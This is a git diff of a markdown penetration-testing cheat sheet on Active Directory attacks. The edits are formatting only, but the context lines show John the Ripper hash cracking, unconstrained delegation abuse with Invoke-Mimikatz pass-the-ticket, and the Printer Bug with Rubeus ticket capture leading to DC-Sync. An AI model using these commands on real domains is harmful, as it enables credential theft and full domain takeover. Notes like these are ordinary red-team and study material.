@@ -144,6 +144,7 @@ C:> john.exe /wordlist=C:\wordlist.txt C:\targetedhashes.txt
 ```
 
 ### Uncostrained Delegation
+---
 With DA access to a host with Unconstrained Delegation enabled, when some user connects, the user TGT can be taken to be able to impersonate passig the ticket (ptt).
 ```powershell
 # Find Server with Unconstraided Delegation Enabled
@@ -161,7 +162,7 @@ C:> Invoke-Mimikatz -Command '"kerberos::ptt C:<ticket_file_name>.kirbi"'
 ```
 - Requisite for elevation using this technique, is to compromise a user with Admin Rights on the host
 
-##### Printer Bug
+#### Printer Bug
 ```powershell
 # Need shell in the server to compromise
 # Launch Rubeus listener to capture TGT from DC 
@@ -185,6 +186,7 @@ C:> Rubeus.exe ptt /ticket:<Base64EncodedTicket>
 # From here, a DC-Sync attack to DC to get krbtgt and also to enterprise DC.
 ```
 ### Constrained Delegation
+---
 With have GenericALL/GenericWrite privileges on a machine account object of a domain, it can be abused, and then impersonate ourselves as any user of the domain to the machine.
 - `msdn-allowedtodelegate`: services that can be abused for impersonation.
 ```powershell
